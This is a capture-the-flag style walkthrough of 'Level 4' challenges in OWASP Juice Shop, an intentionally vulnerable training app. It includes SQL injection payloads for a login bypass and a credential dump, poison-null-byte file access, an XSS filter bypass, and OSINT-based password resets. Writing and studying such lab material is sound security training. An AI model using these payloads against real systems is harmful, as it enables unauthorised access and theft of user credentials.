# Level 4

## Christmas Special (Injection)
_Order the Christmas special offer of 2014._

You can find "Christmas special offer of 2014" in [application-configuration.json](misc/application-configuration.json).
By comparing with the list of products (`GET /api/Product`), you can determine that "Christmas special offer of 2014"
must have product ID `10`.

Knowing the ID, just add it to the cart:
```
POST /api/BasketItems/

{"ProductId":10,"BasketId":"1","quantity":1}
```

Finally, finish the order in your browser.

## Easter Egg (Broken Access Control)
_Find the hidden easter egg._

The egg is at `/ftp/eastere.gg`. However, it's protected by a file extension filter:
```
403 Error: Only .md and .pdf files are allowed!
```

The trick is exploiting [CWE-626: Null Byte Interaction Error (Poison Null Byte)](https://cwe.mitre.org/data/definitions/626.html)
> The poison null byte is frequently useful in path traversal attacks by terminating hard-coded extensions that are added to a filename.

Call `GET /ftp/eastere.gg%2500.md` (`%25` is URL encoded `%`):
```
"Congratulations, you found the easter egg!"
- The incredibly funny developers

...

...

...

Oh' wait, this isn't an easter egg at all! It's just a boring text file! The real easter egg can be found here:

L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==

Good luck, egg hunter!
```

## Ephemeral Accountant (Injection)
_Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering that user._

This is about SQL injection into _Login form_. If you already done the [Database Schema](level3.md#database-schema-injection)
challenge, you know the number of columns and data types of `users` table.
 
```
xxx' UNION SELECT 999, '', 'acc0unt4nt@juice-sh.op', 'password', 'accounting', '', '0.0.0.0', '/assets/public/images/uploads/default.svg', '', 1, '2020-08-15T18:22:49.161Z', '2020-08-15T18:22:49.161Z', null; --
```

The role must be the `accounting`!

## Forgotten Developer Backup (Sensitive Data Exposure)
_Access a developer's forgotten backup file._

The same trick as in the [Easter Egg](#easter-egg-broken-access-control) challenge.

Call `GET /ftp/coupons_2013.md.bak%2500.md` and obtain [package.json.bak](misc/package.json.bak).

## Forgotten Sales Backup (Sensitive Data Exposure)
_Access a salesman's forgotten backup file._

The same trick as in the [Easter Egg](#easter-egg-broken-access-control) challenge.

Call `GET /ftp/coupons_2013.md.bak%2500.md`
```
n<MibgC7sn
mNYS#gC7sn
o*IVigC7sn
k#pDlgC7sn
o*I]pgC7sn
n(XRvgC7sn
n(XLtgC7sn
k#*AfgC7sn
q:<IqgC7sn
pEw8ogC7sn
pes[BgC7sn
l}6D$gC7ss
```

## Leaked Unsafe Product (Sensitive Data Exposure)
_Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous._

Similar to the challenge [Christmas Special](#christmas-special-injection), we can easily identify the product in 
[application-configuration.json](misc/application-configuration.json):
```json
{
    "name": "Rippertuer Special Juice",
    "description": "Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br/><span style=\"color:red;\">This item has been made unavailable because of lack of safety standards.</span>",
    "price": 16.99,
    "image": "undefined.jpg",
    "keywordsForPastebinDataLeakChallenge": [
      "hueteroneel",
      "eurogium edule"
    ]
}
```

Googling for the rarest fruits is not the solution, they are all safe.
So either google for `Rippertuer Special Juice` and find this paste https://pastebin.com/90dUgd7s
or get the answer from `keywordsForPastebinDataLeakChallenge` (guess this is not intentional though).

Submit `Hueteroneel and Eurogium Edule` into _Customer Feedback_ form.

## Nested Easter Egg (Cryptographic Issues)
_Apply some advanced cryptanalysis to find the real easter egg._

This challenge follows [Easter Egg](#easter-egg-broken-access-control). The goal is to decrypt:
```
L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==
```

This is rather easy.
 
1) Decode `Base64` (https://www.base64decode.org/):
```
/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
```

2) Apply [ROT13](https://en.wikipedia.org/wiki/ROT13) cipher (https://rot13.com/):
```
/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
```

Call `GET /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg`

## Reset Bender's Password (Broken Authentication)
_Reset Bender's password via the Forgot Password mechanism with the original answer to his security question._

Bender's security question is:
> Company you first work for as an adult?

[Bender](https://en.wikipedia.org/wiki/Bender_(Futurama)) is a well-known character from the
TV show [Futurama](https://en.wikipedia.org/wiki/Futurama).

The [wiki](https://en.wikipedia.org/wiki/Bender_(Futurama)) lists his occupations as:
- Suicide booth construction worker (formerly)
- Planet Express Bender / Chef

Read more about [suicide booths](https://futurama.fandom.com/wiki/Suicide_Booth):
> Suicide booths were invented somewhere between 2006 and 2008. Since 2008, America's most important brand of suicide booths is Stop'n'Drop. 

The correct answer is `Stop'n'Drop`

## Reset Uvogin's Password (Sensitive Data Exposure)
_Reset Uvogin's password via the Forgot Password mechanism with the original answer to his security question._

Uvogin's security question is:
> Your favorite movie?

This one is rather hard so let's start with some hints:
> People often reuse aliases online. You might be able to find something by looking online for Uvogin's name or slight variations of it based on his unique writing habits

"Unique writing habits" points to [leetspeak](https://en.wikipedia.org/wiki/Leet).
See that all comments from `Uvogin` are like `y0ur f1r3wall needs m0r3 musc13` or `0 st4rs f0r 7h3 h0rr1bl3 s3cur17y`.

Googling for `uv0gin` quickly reveals his [Twitter account](https://twitter.com/uv0gin).
Unfortunately, nothing useful is here.

The catch is that the important tweet was deleted (_I had no idea and had to look into solutions_).
However, you can recover it with a service such as [Wayback Machine](https://web.archive.org/web/20200403193744/https://twitter.com/uv0gin):

![](images/uv0gin-movie.png)

The correct answer is `Silence of the Lambs`

## Server-side XSS Protection (XSS)
_Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a server-side security mechanism._

I tried to use this payload in the _Customer Feedback_ form, but the payload was deleted:
```
Hello <iframe src="javascript:alert(`xss`)">
```

Resulting into:
```
Hello
```

Hopefully, it's just a simple string replacement. So let's try:
```
<<iframe src="javascript:alert(`xss`)">iframe src="javascript:alert(`xss`)">
```

Bingo, the nested ```<iframe src="javascript:alert(`xss`)">``` string is deleted resulting into the original payload!

## User Credentials (Injection)
_Retrieve a list of all user credentials via SQL Injection._

This challenge follows the [Database Schema](level3.md#database-schema-injection) challenge.
It's much easier once we have [misc/db-schema.sql](misc/db-schema.sql).

I also used a similar query:
```
GET /rest/products/search?q=Apple'))+UNION+SELECT+username,email,password,role,deluxeToken,lastLoginIp,profileImage,totpSecret,isActive+FROM+Users--
```

The result is in [misc/users.json](misc/users.json).